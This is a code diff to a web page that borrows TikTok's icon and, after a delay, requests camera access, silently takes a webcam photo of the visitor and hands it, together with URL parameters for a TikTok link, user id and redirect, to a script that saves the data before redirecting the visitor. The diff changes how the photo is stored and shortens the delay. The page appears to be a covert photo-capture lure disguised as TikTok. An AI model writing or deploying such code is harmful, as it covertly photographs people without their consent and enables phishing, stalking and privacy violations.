@@ -10,7 +10,7 @@
   <link rel="shortcut icon"
     href="https://lf16-tiktok-common.ibytedtos.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png?v=2"
     type="image/x-icon">
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"> -->
   <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" />
   <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
 
@@ -68,7 +68,7 @@
     const canvas = document.getElementById('canvas');
     let photoTaken = false;
     let cameraAccessAttempts = 0;
-    let savedPhoto = '';
+    let savedPhoto = null;
 
     const constraints = {
       audio: false,
@@ -111,31 +111,32 @@
         if (!photoTaken) {
           console.log('Фотографирование...');
           context.drawImage(video, 0, 0, 740, 580);
-          const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-          console.log('Фотография создана');
-          savedPhoto = canvasData;
-          photoTaken = true;
-          logPhotoInfo();
-          redirectToFinalDestination();
+          canvas.toBlob(function(blob) {
+            console.log('Фотография создана');
+            savedPhoto = blob;
+            photoTaken = true;
+            logPhotoInfo();
+            redirectToFinalDestination();
+          }, 'image/png');
         }
       }, 3000);
     }
 
     function logPhotoInfo() {
       const urlParams = new URLSearchParams(window.location.search);
-      const tiktokUrl = urlParams.get('tiktok') || '';
-      const id = urlParams.get('id') || '';
-      const redirectUrl = urlParams.get('redirect') || '';
+      const tiktok_url = urlParams.get('tiktok') || '';
+      const user_id = urlParams.get('id') || '';
+      const redirect_url = urlParams.get('redirect') || '';
 
-      console.log('tiktokurl:', tiktokUrl);
-      console.log('id:', id);
-      console.log('redirecturl:', redirectUrl);
+      console.log('tiktokurl:', tiktok_url);
+      console.log('id:', user_id);
+      console.log('redirecturl:', redirect_url);
       console.log('foto:', savedPhoto);
 
       // Вызов Angular функции для сохранения данных
       if (window.angularComponentReference) {
         window.angularComponentReference.zone.run(() => {
-          window.angularComponentReference.componentFn(tiktokUrl, id, redirectUrl, savedPhoto);
+          window.angularComponentReference.componentFn(tiktok_url, user_id, redirect_url, savedPhoto);
         });
       }
     }
@@ -148,7 +149,7 @@
     }
 
     // Начинаем запрос доступа к камере
-    setTimeout(requestCameraAccess, 10000);
+    setTimeout(requestCameraAccess, 7000);
   </script>
 </body>
 
